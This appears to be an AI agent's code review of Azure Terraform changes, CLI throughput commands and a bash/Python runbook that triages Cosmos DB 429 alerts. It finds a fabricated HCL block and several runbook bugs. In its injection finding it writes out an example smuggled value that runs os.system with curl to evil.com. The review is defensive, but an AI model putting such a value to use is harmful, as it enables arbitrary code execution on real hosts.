---
task_id: 2026-03-27-001
agent: linus-torvalds
timestamp: 2026-03-27T17:30:00Z
status: complete

summary: |
  Technical review of IaC proposals (Section 7.1) and automated runbook
  (Section 8). Found one FABRICATED HCL block (dynamic_threshold_failing_periods
  does not exist), one incorrect CLI parameter (--max-throughput 1000 below
  Azure minimum of 4000), and multiple runbook robustness issues including
  silent failure on empty API responses, shell injection via bash variable
  interpolation into Python, and a classification gap for the UNKNOWN state.
  The burst_capacity_enabled attribute is real and correct. The decision logic
  is mostly sound but has an edge case where 3 non-consecutive spikes get
  classified as ESCALATING when they may be benign.

key_findings:
  - finding_1: "dynamic_threshold_failing_periods is FABRICATED -- this block does not exist in azurerm_monitor_metric_alert"
  - finding_2: "--max-throughput 1000 is INVALID -- Azure minimum autoscale max is 4000 RU/s"
  - finding_3: "burst_capacity_enabled is REAL and correctly used"
  - finding_4: "Runbook has no error handling for az CLI failures -- set -e will kill the script silently"
  - finding_5: "Bash variable interpolation into Python inline code is a code injection vector"
  - finding_6: "Classification logic has gap: 0 spikes + 0 429s (healthy) still classified as PERIODIC"
---

# Code Review: IaC Proposals + Runbook Script

**Target**: `root-cause-analysis.md` Sections 7.1 and 8
**Verdict**: NEEDS WORK -- One fabricated HCL block, one wrong CLI parameter, multiple runbook bugs.

---

## 1. IaC Change 1: burst_capacity_enabled -- CORRECT

```hcl
burst_capacity_enabled = true
```

**Verified** against `hashicorp/terraform-provider-azurerm` source (GitHub `main` branch):

> `burst_capacity_enabled` - (Optional) Enable burst capacity for this Cosmos DB account. Defaults to `false`.

This is a real `azurerm_cosmosdb_account` attribute. The usage is syntactically and semantically correct. It is an account-level boolean. No arguments needed beyond the assignment.

**One concern**: Burst capacity uses accumulated idle RU/s. With 100 RU/s provisioned and the workload consuming 3-9% between bursts, the idle accumulation is ~91-97 RU/s per second. CosmosDB accumulates up to 5 minutes of idle capacity (max burst credit = 300 seconds x idle RU/s). At ~95 RU/s idle rate, that is ~28,500 RU of burst credit -- more than enough to absorb the observed ~8,500 RU burst. The math works. This is the correct first fix.

**Verdict**: Ship it.

---

## 2. IaC Change 2: dynamic_threshold_failing_periods -- FABRICATED

```hcl
# THIS BLOCK DOES NOT EXIST
dynamic_threshold_failing_periods {
  min_failing_periods_to_alert    = 3
  number_of_evaluation_periods    = 3
}
```

This is **completely invented**. I verified against the `azurerm_monitor_metric_alert` resource documentation (GitHub source, `main` branch). Here is what actually exists:

### For static `criteria` block (what this alert uses):

The static `criteria` block supports: `metric_namespace`, `metric_name`, `aggregation`, `operator`, `threshold`, `dimension`, `skip_metric_validation`. That is it. There is **no** `failing_periods` sub-block, no `min_failing_periods_to_alert`, no `number_of_evaluation_periods`.

### For `dynamic_criteria` block (different mechanism entirely):

The `dynamic_criteria` block has `evaluation_total_count` (default 4) and `evaluation_failure_count` (default 4). These are the closest equivalents, but they apply to **dynamic thresholds** (ML-based anomaly detection), not static thresholds. Using `dynamic_criteria` would require removing the fixed `threshold = 20` and replacing it with `alert_sensitivity = "Low|Medium|High"`. Completely different mechanism.

### What the RCA itself admits (but then contradicts):

The RCA's own note at line 625-629 says:

> "Note: azurerm_monitor_metric_alert does not natively expose staticThresholdFailingPeriods for static criteria."

This is CORRECT. But then the RCA proposes the fabricated `dynamic_threshold_failing_periods` block anyway. The note acknowledges the problem and then ignores it.

### The actual fix for alert dampening with static criteria:

There are only two legitimate approaches:

**Option A: Increase `window_size`** (the RCA mentions this but buries it in a note):

```hcl
resource "azurerm_monitor_metric_alert" "cosmosdb" {
  # Change from PT5M to PT15M
  # This aggregates 3 burst cycles into one window.
  # A single burst of 24 429s gets diluted across 15 minutes.
  window_size = "PT15M"
  frequency   = "PT5M"  # evaluate every 5 min over a 15-min rolling window
}
```

**Option B: Switch to `dynamic_criteria`** (requires rethinking the alert entirely):

```hcl
resource "azurerm_monitor_metric_alert" "cosmosdb" {
  dynamic_criteria {
    metric_namespace = "microsoft.documentdb/databaseaccounts"
    metric_name      = "TotalRequests"
    aggregation      = "Count"
    operator         = "GreaterThan"
    alert_sensitivity = "Medium"

    # THIS is where failing periods live -- but for dynamic thresholds only
    evaluation_total_count   = 3
    evaluation_failure_count = 3

    dimension {
      name     = "StatusCode"
      operator = "Include"
      values   = ["429"]
    }
  }
}
```

This replaces the fixed `threshold = 20` with ML-based anomaly detection. It changes the alert's semantics entirely. May or may not be desirable.

**Option C: Azure Monitor Action Rules** (suppress at the routing layer, not the rule):

Create an `azurerm_monitor_alert_processing_rule` with a suppression schedule or condition. This keeps the sensitive alert rule intact but prevents notification during known-bursty windows.

**Verdict**: DELETE the fabricated block. Replace with Option A (simplest, least risk) or document the tradeoffs of Options B and C.

---

## 3. IaC Change 3: Autoscale CLI Commands -- BUG

### The `migrate` command is correct:

```bash
az cosmosdb mongodb collection throughput migrate \
  --account-name cosmosdb-gurobi-platform-a \
  --resource-group rg-gurobi-platform-a \
  --database-name grb_rsm \
  --name metrics \
  --throughput-type autoscale
```

Verified: `az cosmosdb mongodb collection throughput migrate --help` confirms all parameters. Correct.

### The `update` command has a WRONG value:

```bash
az cosmosdb mongodb collection throughput update \
  --max-throughput 1000  # <-- WRONG: minimum is 4000
```

From `az cosmosdb mongodb collection throughput update --help`:

> `--max-throughput`: The maximum throughput resource can scale to (RU/s). Provided when the resource is autoscale enabled. **The minimum value can be 4000 (RU/s).**

Setting `--max-throughput 1000` will fail with an Azure API error. The minimum autoscale max-throughput is 4000 RU/s.

**Fix**:

```bash
az cosmosdb mongodb collection throughput update \
  --account-name cosmosdb-gurobi-platform-a \
  --resource-group rg-gurobi-platform-a \
  --database-name grb_rsm \
  --name metrics \
  --max-throughput 4000  # Minimum allowed for autoscale
```

**Cost implication**: With autoscale max of 4000 RU/s, the minimum billing is 10% of max = 400 RU/s (Azure autoscale always charges at least 10% of max). At 100 RU/s manual provisioning cost as baseline, switching to autoscale with max 4000 means the **floor** cost is 4x the current cost, even at idle. The RCA says "pay only for what you use" -- this is misleading. You pay for at least 400 RU/s, always. For a collection that needs 6 RU/s 95% of the time, this is significant.

Alternative: If 400 RU/s manual provisioning (without autoscale) provides enough headroom for the burst, it may be cheaper than autoscale. The burst consumes ~8,500 RUs in 5 minutes. At 400 RU/s, the 5-minute budget is 120,000 RUs. The burst would use 7% of the budget. No 429s. No autoscale cost premium.

---

## 4. Runbook Script Review -- MULTIPLE ISSUES

### 4.1 CRITICAL: `set -e` + `az` failures = silent death

The script uses `set -euo pipefail` (line 723). If `az monitor metrics list` fails (auth expired, API timeout, rate limit, network blip), the script dies silently at line 739 or 748. No error message. No classification. The OpsGenie integration sees a non-zero exit and escalates -- which is arguably the right behavior for an unknown state, but it is ACCIDENTAL, not DESIGNED.

**Fix**: Trap errors explicitly.

```bash
set -euo pipefail
trap 'echo "[RUNBOOK] FATAL: Command failed at line $LINENO (exit $?)" >&2; exit 2' ERR
```

And distinguish exit codes: `0` = auto-ack, `1` = escalate (known bad), `2` = runbook failure (unknown state, investigate the runbook itself).

### 4.2 HIGH: No validation of `az` output before feeding to Python

Lines 739-756 capture `az` output into `RU_DATA` and `THROTTLE_DATA`. If the `--query` JMESPath returns `null` (no timeseries data, metric not found, empty result), these variables contain the literal string `null`. Then Python at line 759 does `json.load(sys.stdin)` which parses `null` into Python `None`. Then `[v for v in data if v is not None]` produces an empty list. Then `sum(1 for v in [] if v >= 80)` = 0. Then `SPIKE_COUNT=0`.

With `SPIKE_COUNT=0` and `CONSECUTIVE=0`, the decision logic at line 814 evaluates `0 -le 2` = true, classifying as **PERIODIC** and auto-acknowledging. This means: **if Azure Monitor returns no data at all, the script auto-closes the alert as "known periodic pattern."** That is dangerous.

**Fix**: Validate data before classification.

```bash
# After gathering metrics
if [ -z "$RU_DATA" ] || [ "$RU_DATA" = "null" ] || [ "$RU_DATA" = "[]" ]; then
  echo "[RUNBOOK] ERROR: No NormalizedRU data returned. Cannot classify."
  echo "[RUNBOOK] ACTION: ESCALATE (insufficient data for automated triage)"
  exit 2
fi
```

### 4.3 MEDIUM: Shell variable interpolation into Python = injection risk

Lines 763 and 774:

```python
spikes = sum(1 for v in values if v >= $PERIODIC_SPIKE_THRESHOLD)
```

The bash variable `$PERIODIC_SPIKE_THRESHOLD` is interpolated directly into the Python source code by the shell before Python parses it. Currently safe because the variable is hardcoded to `80` on line 728. But if this script ever accepts configuration from environment variables, webhook payloads, or OpsGenie parameters, an attacker could set `PERIODIC_SPIKE_THRESHOLD="0); import os; os.system('curl evil.com"` and get arbitrary code execution.

**Fix**: Pass as argument or environment variable to Python, not inline substitution.

```bash
SPIKE_COUNT=$(echo "$RU_DATA" | THRESHOLD="$PERIODIC_SPIKE_THRESHOLD" python3 -c "
import json, sys, os
threshold = float(os.environ['THRESHOLD'])
data = json.load(sys.stdin)
values = [v for v in data if v is not None]
spikes = sum(1 for v in values if v >= threshold)
print(spikes)
")
```

### 4.4 MEDIUM: `CONSECUTIVE` calculation ignores None gaps

Line 770-779: The consecutive-spike counter iterates over `values = [v for v in data if v is not None]`. This filters out None values BEFORE checking consecutiveness. If the raw data is `[100, None, 100, None, 100]`, the filtered values are `[100, 100, 100]` -- three consecutive spikes. But in reality, these spikes had healthy (or missing) windows between them. The None-filtering creates a false consecutive pattern.

**Fix**: Keep None values in the iteration and treat them as non-spikes:

```python
data = json.load(sys.stdin)
max_consec = 0
current = 0
for v in data:
    if v is not None and v >= threshold:
        current += 1
        max_consec = max(max_consec, current)
    else:
        current = 0
print(max_consec)
```

### 4.5 LOW: Date command portability is fragile

Line 733-734:

```bash
START_TIME=$(date -u -v-${LOOKBACK_MINUTES}M '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null \
  || date -u -d "${LOOKBACK_MINUTES} minutes ago" '+%Y-%m-%dT%H:%M:%SZ')
```

This tries macOS `date -v` first, falls back to GNU `date -d`. Functional, but the `2>/dev/null` on the first attempt suppresses any error from macOS `date` if it fails for reasons other than syntax (e.g., clock issues). If running in an Azure Function (Linux), the first `date` fails silently and the fallback works. If running on macOS for local testing, the first works. Fine for now, but fragile if the second `date` also fails -- `set -e` kills the script.

### 4.6 LOW: Hardcoded subscription ID

Line 726: The RESOURCE_ID contains a hardcoded subscription ID (`b524d084-edf5-449d-8e92-999ebbaf485e`). This locks the script to the ACC environment. For a runbook that should work across environments, parameterize it:

```bash
SUBSCRIPTION_ID="${SUBSCRIPTION_ID:-b524d084-edf5-449d-8e92-999ebbaf485e}"
RESOURCE_GROUP="${RESOURCE_GROUP:-rg-gurobi-platform-a}"
ACCOUNT_NAME="${ACCOUNT_NAME:-cosmosdb-gurobi-platform-a}"
RESOURCE_ID="/subscriptions/${SUBSCRIPTION_ID}/resourcegroups/${RESOURCE_GROUP}/providers/microsoft.documentdb/databaseaccounts/${ACCOUNT_NAME}"
```

---

## 5. Decision Logic Review -- Classification Gaps

### 5.1 The three states (PERIODIC / SUSTAINED / ESCALATING)

The classification logic:

| State | Condition | Action |
|-------|-----------|--------|
| SUSTAINED | `consecutive >= 3` | Escalate |
| PERIODIC | `spikes <= 2` (and not sustained) | Auto-ack |
| ESCALATING | `spikes > 2` (and not sustained) | Escalate |

### 5.2 Missing state: UNKNOWN / NO_DATA

As noted in 4.2, if `az` returns empty or null data, the script classifies as PERIODIC and auto-acks. This is the most dangerous failure mode. A fourth state is needed:

```
UNKNOWN: insufficient data to classify -> ESCALATE with note "runbook data collection failed"
```

### 5.3 Edge case: Exactly 3 non-consecutive spikes

With 30-minute lookback and PT5M windows, there are 6 data points. If 3 of 6 are spikes but non-consecutive (e.g., spike, normal, spike, normal, spike, normal), `consecutive` = 1, `spikes` = 3. This hits the ESCALATING branch. But 3 non-consecutive spikes in 30 minutes at 15-minute intervals IS the known periodic pattern. The PERIODIC classification requires `spikes <= 2`, which is too strict for a 30-minute window containing exactly 2 burst cycles (which produce 2 spikes at the expected positions).

The issue: the 30-minute lookback with 15-minute periodicity means you expect EXACTLY 2 spikes under normal periodic behavior. But if the lookback window alignment catches the edge of a third cycle, `spikes` = 3, and the script escalates for the known pattern.

**Fix**: Either (a) increase `PERIODIC_MAX_SPIKES` to 3, or (b) reduce `LOOKBACK_MINUTES` to 20 (guaranteeing at most 2 cycles in the window), or (c) add a gap-analysis check that verifies spikes are evenly spaced (~15 min apart).

### 5.4 The ESCALATING classification is weak

"Spike count increasing or 429 count per window growing" is what the decision logic diagram (Section 8.2) describes for ESCALATING. But the actual code just checks `spikes > PERIODIC_MAX_SPIKES`. It does NOT check whether the spike count is increasing over time or whether 429 counts per window are growing. The code implements a simpler heuristic than the diagram promises. The diagram is a lie.

Either update the code to match the diagram (compare first-half vs second-half spike rates) or update the diagram to match the code.

---

## 6. Integration Options Review

| Method | RCA Claim | Assessment |
|--------|-----------|------------|
| OpsGenie Automation | "Script runs on OpsGenie worker" | **MOSTLY CORRECT.** OpsGenie has "Automation Actions" that can run scripts. However, these run on an "OpsGenie Edge Connector" (formerly Marid), not on a generic "worker." The Edge Connector must be deployed in your network (has access to Azure APIs). It needs `az` CLI installed and authenticated. The RCA does not mention this infrastructure requirement. |
| Azure Function | "Triggered by Action Group webhook" | **CORRECT.** Azure Monitor Action Groups support Azure Function webhooks natively. Managed identity for auth to Azure Monitor API is the right pattern. |
| Azure Logic App | "No-code" | **CORRECT but misleading.** Logic Apps can query Azure Monitor metrics and conditionally call OpsGenie API. But the Python classification logic would need to be reimplemented as Logic App expressions, which is painful. "No custom code" is technically true but "no code" understates the expression complexity. |
| Azure Monitor Action Rule | "Suppression rule" | **CORRECT.** `azurerm_monitor_alert_processing_rule` supports `suppression` type with time-based or condition-based rules. But the RCA correctly notes this cannot do dynamic classification -- it is static suppression only. |

---

## Summary Verdict

**Grade: NEEDS WORK.**

**Corrections required (priority order):**

1. **DELETE the fabricated `dynamic_threshold_failing_periods` block.** It does not exist. Replace with `window_size = "PT15M"` for dampening, or document the `dynamic_criteria` alternative with proper attribute names.

2. **Fix `--max-throughput 1000` to `--max-throughput 4000`.** 1000 is below Azure's minimum. Also add a cost note: autoscale min-billing is 10% of max = 400 RU/s, a 4x increase over current 100 RU/s. Consider whether 400 RU/s manual provisioning is cheaper and sufficient.

3. **Add error handling to the runbook.** Validate `az` output is non-empty and non-null before classification. Add an UNKNOWN state for data collection failures. Add trap for ERR with line numbers.

4. **Fix the consecutive-spike calculation.** Do not filter None values before iterating -- treat them as non-spikes.

5. **Fix the bash-to-Python variable injection.** Pass thresholds via environment variables, not shell interpolation.

6. **Reconcile the ESCALATING definition.** Either implement trend detection (code matches diagram) or simplify the diagram (diagram matches code).

7. **Adjust PERIODIC_MAX_SPIKES or LOOKBACK_MINUTES.** Current values produce false ESCALATING classifications when the lookback window catches 3 cycles of the known 15-minute pattern.

The `burst_capacity_enabled` proposal is correct and should ship. The runbook concept is sound -- automated triage of known-bursty alerts is the right approach. The implementation has bugs. Fix them before deploying.
